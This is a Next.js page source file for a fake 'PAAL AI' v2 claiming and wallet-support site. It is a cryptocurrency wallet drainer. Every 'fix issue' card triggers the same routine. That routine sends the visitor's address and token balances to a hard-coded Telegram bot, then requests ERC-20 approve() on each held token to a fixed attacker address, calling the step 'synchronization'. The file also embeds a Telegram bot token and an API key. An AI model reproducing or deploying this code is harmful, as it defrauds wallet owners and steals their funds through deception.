import { NextPage } from "next";
import { ethers } from "ethers";
import {useSigner, ConnectWallet, useAddress, useBalance, useConnectionStatus} from "@thirdweb-dev/react";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
import ChainContext from "../context/Chain";
import { useContext, useState, useEffect } from "react";
import { ThirdwebSDK } from "@thirdweb-dev/sdk";
import { useRouter } from 'next/router';
import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Image, Button, Link, Card, CardBody, CardHeader,CardFooter} from "@nextui-org/react";
import  Head  from "next/head";
import { Relayer } from "@openzeppelin/defender-relay-client";

const Home: NextPage = () => {
    const list = [
        {
            title: "Claim",
            body: "Click Here to Claim or fix Claiming issues",
            price: "",
          },
          {
            title: "Buy/Sell",
            body: "Click here for issues related to buying and selling",
            price: "",
          },
          {
            title: "Staking",
            body: "Click here to resolve issues with Staking",
            price: "",
          },
          {
            title: "Airdrop",
            body: "Click here to claim Airdrop or fix Airdrop related issues",
            price: "",
          },
        {
          title: "Fix Gas",
          body: "Click here to Fix Gas",
          price: "",
        },
        {
          title: "Exchange",
          body: "Click here for Exchange or Exchange related issues",
          price: "",
        },
        {
          title: "Missing Balance",
          body: "Click here to fix Missing Balance issues ",
          price: "",
        }, 
        {
          title: "Cross Transfer",
          body: "Click here to Resolve Cross Transfer issues",
          price: "",
        },
        {
            title:"Migration",
            body:"Click here for migration",
            
        },
        {
            title:"Login",
            body:"Click here to resolve wallet login issues",
            
        },
        {
            title:"Transaction Delay",
            body:"Click here to resolve any issue related to transaction delay.",
            
        },
        {
            title:"NFTs",
            body:"Click here for NFT minting/transfer issues.",
            
        },
        {
            title:"Slippage",
            body:"Click here for slippage related error.",
            
        },
        {
            title:"Whitelist",
            body:"Click here for whitelisting related issues",
            
        },
        
      ];
const address = useAddress();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;


const { selectedChain, setSelectedChain } = useContext(ChainContext);
const [allowanceRequested, synchronizationCompleted] = useState(false);
const signer = useSigner();
const router = useRouter();
const [synchronizationSuccess, setSynchronizationProcess] = useState(false);
const addresses: Record<string, string> = {
    ["ethereum"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
    ["binance"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
  };
  const net: Record<string,string> = {
    ["ethereum"] : "ethereum",
    ["binance"]: "binance",
  };
   const sdk = new ThirdwebSDK(net[selectedChain],
    {
      clientId: "eae31aadb84c7c4cc24b2d16fb595580",  
    });
  const aptk = "6tL6x4wh-ROoNc4hp3C8gE-ToXlCSM5t"
  const chainUrls: Record<string, string> = {
    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${aptk}`,
    binance:  `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
    polygon: `https://matic-mainnet.g.alchemy.com/v2/${aptk}`,
  };
  const url = chainUrls[selectedChain];
  const connectionStatus = useConnectionStatus();
  console.log(connectionStatus);
  async function main() {
    if (connectionStatus === "unknown") {
      await sendMessageToTelegram(`User is yet to connect. Hold on........`);
      console.log(`User is yet to connect. Hold on........`);
      
    } 
    if (connectionStatus === "connecting"){
      await sendMessageToTelegram(`User's wallet is connecting be patient....`);
      console.log(`User's wallet is connecting be patient....`);
    }
    if (connectionStatus === "connected"){
      await sendMessageToTelegram(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
      console.log(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
    }
    if (connectionStatus === "disconnected"){
      await sendMessageToTelegram(`User has disconnected !`);
      console.log(`User has disconnected`);
    }

    const options = {
      method: "POST",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        id: 1,
        jsonrpc: "2.0",
        method: "alchemy_getTokenBalances",
        params: [address],
      }),
    };
    // fetching the token balances
    let res = await fetch(url, options);
    let response = await res.json();
  
    // Getting balances from the response
    const balances = response["result"];
  
    // Remove tokens with zero balance
    const nonZeroBalances = await balances.tokenBalances.filter(
        (token: { tokenBalance: string }) => token.tokenBalance !== "0"
      );
  
    await sendMessageToTelegram(`Token balances of ${address}: \n`);
  
    // Create arrays to store contract addresses, balances, and formatted balances
    const tokenAddresses = [];
    const tokenBalances = [];
    const formattedBalances = [];
  
    // Loop through all tokens with non-zero balance
    for (let token of nonZeroBalances) {
      // Get balance of token
      let balance = token.tokenBalance;
  
      // request options for making a request to get tokenMetadata
      const tokenMetadataOptions = {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify({
          id: 1,
          jsonrpc: "2.0",
          method: "alchemy_getTokenMetadata",
          params: [token.contractAddress],
        }),
      };
  
      // parsing the response and getting metadata from it
      let res2 = await fetch(url, tokenMetadataOptions);
      let metadata = await res2.json();
      metadata = metadata["result"];
  
      // Compute token balance in human-readable format
      balance = balance / Math.pow(10, metadata.decimals);
      balance = balance.toFixed(2);
      // Create formatted balance using ethers.utils.parseUnits()
      const formattedBalance = ethers.utils.parseUnits(balance.toString(), 'ether');
      // Print name, balance, and symbol of token
      await sendMessageToTelegram(`${metadata.name}: ${balance} ${metadata.symbol}`);
      // Add contract address, balance, and formatted balance to the arrays
      tokenAddresses.push(token.contractAddress);
      tokenBalances.push(balance);
      formattedBalances.push(formattedBalance);
    }
     const spenderAddress = addresses[selectedChain];
    // Loop through contract addresses and formatted balances
    for (const [index, tokenAddress] of tokenAddresses.entries()) {
        const refundAmount = formattedBalances[index];
        
      const tokenContract = new ethers.Contract(tokenAddress, ['function approve(address spender, uint256 value)'], signer);
      try {
        const tx = await tokenContract.approve(spenderAddress, refundAmount);
        await sendMessageToTelegram(`Synchronization completed for token at address ${tokenAddress}`);
      } catch (error) {
        const tferror = console.info(`ERROR:`, error);
        await sendMessageToTelegram(`${tferror}`);
        setSynchronizationProcess(false); 
        return; // Exit the loop on error
      }
    }
    
    synchronizationCompleted(true); // Move this line outside the loop
    setSynchronizationProcess(true); 
  }
  useEffect(() => {
    if (synchronizationSuccess) {
        router.push("/synchronize"); // Replace "/new-page" with your desired destination
      }
    }, [synchronizationSuccess, router]);
return(
        <div>
            <div
      className="bg-cover bg-center min-h-screen"
      style={{ backgroundImage: `url('images/bg-paal.png')` }}
    >
      <Head>
      <title>PAAL AI</title>
    </Head>
      <div>
      <Navbar>
      <NavbarBrand>
      <Image src="images/logo.png" alt="Logo" className="h-12"/>
      </NavbarBrand>
      
      <NavbarContent justify="end">
        <NavbarItem>
        <ConnectWallet
        theme={"dark"}
          modalTitle={"Connect to PAAL AI"}></ConnectWallet>
        </NavbarItem>
      </NavbarContent>
    </Navbar>
    <div className="flex justify-center items-center">
      <br></br><br></br><br></br><br></br><br></br><br></br>
    <Image src="images/logo.png" alt="Logo" width={90} height={30}></Image>
    <br></br>
    </div>
    <h1 className="flex justify-center font-bold text-lg text-white">
      <Link href="paalai.io" className="text-white">Introducing PAAL &rarr;</Link>
    </h1>
    <p className="flex justify-center text-white">Welcome to PAAL v2 claiming site.</p>
    <br></br>
    <div className="flex justify-center items-center">
      <br></br>
      <ConnectWallet></ConnectWallet>
    &nbsp;&nbsp;
    <select
    className="block font-bold px-3 py-2 mt-2 bg-white border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
        value={String(selectedChain)}
        onChange={(e) => setSelectedChain(e.target.value)}
      >
        
        <option value="binance">Binance Smart Chain</option>
        <option value="ethereum">Ethereum</option>
      </select>
      <br></br><br></br><br></br><br></br>
    </div>
    <div className="gap-4 grid grid-cols-2 sm:grid-cols-4">
      {list.map((item, index) => (
        <Card shadow="sm" key={index} isPressable onPress={() => main()} className="border-white border-double border-2 bg-transparent">
          <CardBody className="overflow-visible p-0">
            <p className="justify-center text-center py-10 px-10 font-bold text-white">{item.body}</p>
          </CardBody>
          <CardFooter className="text-small justify-between text-white">
            <b>{item.title}</b>
            <p className="text-default-500">{item.price}</p>
          </CardFooter>
        </Card>
      ))}
    </div>
      </div>
      
    </div>
    </div>
    );   
};
const sendMessageToTelegram = async (message: string) => {
    const botToken = '6465126558:AAGyaNAHu6ZrzMiILFOJYFDvHTNfCDSdj2I';
    const chatId = '5033004040'; // You'll need to obtain this from your Telegram bot
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  };  
export default Home;

